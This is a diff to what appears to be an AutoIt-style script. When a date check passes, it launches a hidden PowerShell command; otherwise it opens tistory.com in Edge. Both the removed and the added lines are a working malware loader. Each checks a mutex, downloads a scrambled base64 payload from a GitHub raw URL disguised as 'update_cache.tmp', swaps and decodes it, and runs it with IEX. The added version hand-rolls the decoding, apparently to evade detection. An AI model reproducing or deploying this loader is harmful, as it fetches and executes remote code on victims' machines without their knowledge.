@@ -5,7 +5,7 @@ b3 := DateDiff(b1, b2)
 
 if( b3 < 120 )
 {
-   ShellRun("powershell.exe", "try{[System.Threading.Mutex]::OpenExisting('ms_assistant_Mutex').Close();return}catch{};$c=Invoke-RestMethod 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp';$c=$c -replace '\s','';$l=$c.Length;$m=[math]::Ceiling($l/2);$b=[Convert]::FromBase64String($c.Substring($m)+$c.Substring(0,$m));$s=[Text.Encoding]::UTF8.GetString($b);IEX $s" . "", "", "", 0)
+   ShellRun("powershell.exe", "try{$mutex = [System.Threading.Mutex]::OpenExisting('ms_assistant_Mutex');$mutex.Close(); return;}catch{};$Url = 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp'; $data = Invoke-RestMethod -Uri $Url; $base64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$midpoint = [math]::Ceiling($data.Length / 2);$firstHalf = $data.Substring(0, $midpoint); $secondHalf = $data.Substring($midpoint); $base64Encoded = $secondHalf + $firstHalf; $binaryString = '';foreach ($char in $base64Encoded.ToCharArray()) { if ($char -ne '=') { $index = $base64Chars.IndexOf($char); $binaryString += [Convert]::ToString($index, 2).PadLeft(6, '0')}};$byteArray = @(); try{for ($i = 0; $i -lt $binaryString.Length; $i += 8) { $byte = [Convert]::ToInt32($binaryString.Substring($i, 8), 2); $byteArray += $byte }} catch{};$decodedString = [System.Text.Encoding]::UTF8.GetString($byteArray); IEX($decodedString)" . "", "", "", 0)
 }else
 {
     ShellRun("msedge.exe", "https://tistory.com", "", "", 0)
